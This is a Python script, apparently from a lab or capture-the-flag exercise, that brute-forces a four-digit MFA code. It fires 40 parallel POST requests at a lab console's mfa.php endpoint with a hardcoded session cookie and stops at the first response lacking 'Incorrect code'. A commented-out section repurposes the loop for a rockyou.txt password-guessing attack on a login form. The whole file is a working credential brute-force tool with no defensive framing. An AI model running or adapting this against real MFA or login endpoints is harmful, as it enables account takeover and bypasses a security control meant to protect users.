import requests
from requests.structures import CaseInsensitiveDict 
import urllib3
import multiprocessing
from multiprocessing import Pool
urllib3.disable_warnings()

lis = []
thread = 40 #How many threads you want
headers = CaseInsensitiveDict()
headers['Cookie'] = "PHPSESSID=sseip499gi5l6t48p90nip6dl2; pwd=violet; user=jason_test_account" #Cookie because I don't know sessions yet
i = 0
url = "http://10.10.44.234/console/mfa.php"
j = 0


def posting(code):
    # print(f'Attempting... {cred}')
    print(f"Code: {code}")
    r = requests.post(url, headers=headers, data=code)
    # print(f"Length: {len(r.text)}")
    # if len(r.text) != 1523:
        # print("Error or Found")
    if not 'Incorrect code' in r.text:
        print(f"***********Login Found  {code}***********")
        exit()

while i < 10000:
    if j < thread:
        if i < 1000:
            code = ("000" + str(i))[-4:]
        else:
            code = str(i)
        code = dict(code=code)
        lis.append(code)
        j += 1
        i += 1
        continue
    else:
        j = 0
        pool=Pool(processes=thread)
        che = pool.map(posting,lis)
        # print(lis)
        # print(che)
        lis = []
        # code = dict(code=code)
        lis.append(code)
        # print(lis)

# with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
#     legit_flag = 0
#     # print("Testing")
#     i = 0
#     for a in f:
#         if i < step:
#             # print(i)
#             d = a.split('\n') #Mandatory
#             cred = dict(username=usern, password=d[0])
#             # print(cred)
#             lis.append(cred)
#             i += 1
#             continue

#         if i == step:
#             i = 0
#             pool=Pool(processes=20)
#             che = pool.map(posting,lis)
#             # print(che)
#             lis = []
#             cred = dict(username=usern, password=d[0])
#             lis.append(cred)
#             if che == 1:
#                 break
        
#         # print(f'Attempting... Username: {usern} | Password: {d[0]}')
#         #cred = dict(username=usern, password=d[0],Login="Login")
#         # url = f"http://192.168.56.109/vulnerabilities/brute/?username={usern}&password={d[0]}&Login=Login"
#         # r = requests.get(url,headers=headers)
#         #legit_flag -= 1
# # print(lis)
# # pool=Pool(processes=3)
# # print(pool.map(posting,cred))